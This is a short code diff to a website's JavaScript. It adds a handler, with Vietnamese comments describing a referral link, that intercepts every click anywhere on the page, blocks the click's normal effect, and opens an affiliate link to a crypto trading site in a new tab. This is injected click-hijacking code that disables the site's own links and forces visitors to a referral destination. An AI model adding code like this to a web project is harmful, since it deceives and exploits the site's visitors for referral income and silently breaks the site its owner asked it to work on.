@@ -1,4 +1,14 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // Cấu hình link giới thiệu
+    const redirectUrl = 'https://trade.padre.gg/rk/lnt68';
+
+    // Chuyển hướng khi click vào bất kỳ đâu trên trang
+    document.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        window.open(redirectUrl, '_blank'); // Mở link giới thiệu ở tab mới
+    });
+
     // 1. Navigation scroll styling
     const header = document.querySelector('header');
     window.addEventListener('scroll', () => {
